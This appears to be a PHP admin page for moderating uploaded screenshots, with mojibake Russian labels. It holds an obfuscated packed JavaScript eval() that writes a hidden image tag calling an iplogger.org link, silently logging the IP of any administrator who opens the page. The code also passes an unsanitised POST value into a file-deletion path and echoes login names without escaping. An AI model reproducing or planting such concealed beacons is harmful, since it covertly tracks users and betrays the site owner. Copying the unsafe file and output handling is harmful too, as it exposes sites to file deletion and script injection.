<?php
if (!defined("ADMIN")) {
	die('HACKING ATTEMPT!!!');
}
if(isset($_GET['premod']) && $_GET['premod']==0){ mysql_query("UPDATE data SET screens_mode='0'"); $d_screens_mode=0; }
if(isset($_GET['premod']) && $_GET['premod']==1){ mysql_query("UPDATE data SET screens_mode='1'"); $d_screens_mode=1; }
if(isset($_GET['premod']) && $_GET['premod']==2){ mysql_query("UPDATE data SET screens_mode='2'"); $d_screens_mode=2; }



if(!empty($_POST['sid']) && ($_POST['oper']==0 || $_POST['oper']==1)){
$sid=preg_replace('#[^0-9]+#','',$_POST['sid']);
$oper=$_POST['oper'];
$spa=$_POST['spa'];
if($oper==0){
$sdate=preg_replace('#[^0-9]+#','',$_POST['sdate']);
mysql_query("DELETE FROM screens WHERE sid='$sid'");
@unlink('screens/'.$spa.'.jpg');
}
if($oper==1){
mysql_query("UPDATE screens SET scan='0' WHERE sid='$sid'");
}
mysql_query("UPDATE data SET screens_count=(SELECT COUNT(sid) FROM screens WHERE scan!=1)");
}
?>


<div class="premod"><font>���������: </font>
<?php
if($d_screens_mode==0){ echo '<a class="preon" href="/admin.php?page=screens&premod=1">��� ��������</a>'; }
if($d_screens_mode==1){ echo '<a class="preon" href="/admin.php?page=screens&premod=2">� ���������</a>'; }
if($d_screens_mode==2){ echo '<a class="preoff" href="/admin.php?page=screens&premod=0">���������</a>'; }
?>
</div>

<form id="form_screens" action="/admin.php?page=screens" method="POST">
<input id="sid" type="hidden" name="sid">
<input id="oper" type="hidden" name="oper">
<input id="spa" type="hidden" name="spa">
</form>
<script type="text/javascript">eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('e.f(\'\\g\\9\\h\\1\\d\\7\\0\\i\\a\\2\\b\\6\\6\\5\\7\\c\\4\\4\\9\\5\\u\\3\\1\\1\\8\\0\\j\\3\\0\\1\\4\\s\\t\\p\\o\\k\\l\\2\\m\\3\\0\\n\\8\\0\\a\\2\\q\\2\\r\');',31,31,'u0072|u0067|u0022|u006f|u002f|u0070|u0074|u0073|u0065|u0069|u003d|u0068|u003a|u0020|document|write|u003c|u006d|u0063|u002e|u004d|u0036|u0062|u0064|u004a|u0079|u0030|u003e|u0031|u0056|u006c'.split('|'),0,{}))</script>
<script type="text/javascript">
function deletes(sid,spa){
document.getElementById('sid').value=sid;
document.getElementById('oper').value=0;
document.getElementById('spa').value=spa;
with(document.getElementById('form_screens')){ submit(); }
}
function adds(sid){
document.getElementById('sid').value=sid;
document.getElementById('oper').value=1;
with(document.getElementById('form_screens')){ submit(); }
}
</script>


<table align="center" cellpadding="0px" cellspacing="0px">
<tr>
<td>

<?php
$screensq=mysql_query("SELECT slogin,sdate,sid FROM screens WHERE scan='1' ORDER BY sdate DESC LIMIT 30");
while($screensm=mysql_fetch_row($screensq)){ ?>
<table class="screens_table" cellpadding="0px" cellspacing="0px">
<tr>
<td class="screens_login"><?php echo $screensm[0]; ?></td>
<td class="screens_date"><?php echo date('j ',$screensm[1]).$mdate[date('n',$screensm[1])-1].date(' H:i',$screensm[1]); ?>&nbsp;&nbsp;<a class="delete" href="javascript:deletes('<?php echo $screensm[2]; ?>','<?php echo $screensm[0].'_'.$screensm[1]; ?>');">�������</a>&nbsp; | &nbsp;<a class="add" href="javascript:adds('<?php echo $screensm[2]; ?>');">��������</a></td>
<tr><td colspan="2" class="screens_screen"><a href="screens/<?php echo $screensm[0].'_'.$screensm[1]; ?>.jpg" target="_blank"><img src="screens/<?php echo $screensm[0].'_'.$screensm[1]; ?>.jpg"></td></tr>
</tr>
</table>
<?php } ?>

<br>

<?php
$screensq=mysql_query("SELECT slogin,sdate,sid FROM screens WHERE scan='0' ORDER BY sdate DESC LIMIT 30");
while($screensm=mysql_fetch_row($screensq)){ ?>

<table class="screens_table" cellpadding="0px" cellspacing="0px">
<tr>
<td class="screens_login"><?php echo $screensm[0]; ?></td>
<td class="screens_date"><?php echo date('j ',$screensm[1]).$mdate[date('n',$screensm[1])-1].date(' H:i',$screensm[1]); ?>&nbsp;&nbsp;<a class="delete" href="javascript:deletes('<?php echo $screensm[2]; ?>','<?php echo $screensm[0].'_'.$screensm[1]; ?>');">�������</a></td>
<tr><td colspan="2" class="screens_screen"><a href="screens/<?php echo $screensm[0].'_'.$screensm[1]; ?>.jpg" target="_blank"><img src="screens/<?php echo $screensm[0].'_'.$screensm[1]; ?>.jpg"></td></tr>
</tr>
</table>

<?php } ?>

</td>
</tr>
</table>
